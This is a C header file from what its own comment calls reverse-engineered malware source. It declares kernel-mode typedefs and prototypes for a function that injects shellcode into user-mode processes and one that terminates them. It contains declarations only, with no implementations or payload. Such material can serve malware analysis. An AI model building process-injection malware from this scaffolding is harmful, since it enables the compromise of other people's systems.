/*
 _   __ _____ _____  _    _ _   _
| | / /|  ___|  _  || |  | | | | |
| |/ / | |__ | | | || |  | | | | |
|    \ |  __|| | | || |/\| | | | |
| |\  \| |___\ \_/ /\  /\  / |_| |
\_| \_/\____/ \___/  \/  \/ \___/
                            2023
Copyright (c) Fluxuss Cyber Tech Desenvolvimento de Software, SLU (FLUXUSS)
Copyright (c) Fluxuss Software Security, LLC

! Reversed Soruce code from the original malware and maybe not equivalent the original source code.
*/

#pragma once
#include <ntifs.h>

typedef NTSTATUS ( NTAPI* _NtWriteVirtualMemory )( 
    
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytesToWrite,
    _Out_opt_ PULONG NumberOfBytesWritten
    
);

static _NtWriteVirtualMemory NtWriteVirtualMemory = 0;

typedef struct _PS_ATTRIBUTE {

    ULONG_PTR Attribute;
    SIZE_T Size;
    union {

        ULONG_PTR Value;
        PVOID ValuePtr;

    } nao_tem_nome;
    PSIZE_T ReturnLength;

} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {

    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef NTSTATUS ( NTAPI* PUSER_THREAD_START_ROUTINE )(

    _In_ PVOID ThreadParameter
    
);

typedef NTSTATUS ( NTAPI* _ZwCreateThreadEx ) (

    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PUSER_THREAD_START_ROUTINE StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits OPTIONAL,
    IN SIZE_T StackSize OPTIONAL,
    IN SIZE_T MaximumStackSize OPTIONAL,
    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL
    
);

static _ZwCreateThreadEx ZwCreateThreadEx = 0;

NTSTATUS InjectShellcodeOnUsermodeProcess(
    
    _In_ SIZE_T szPid,
    _In_ PVOID pNtWriteSsdt,
    _In_ PVOID pNtWriteSsdtCreate,
    _In_ unsigned char* chShellcode,
    _In_ ULONG ulShellcode

);

NTSTATUS TerminateUsemodeProcess(
    
    _In_ SIZE_T szPid

);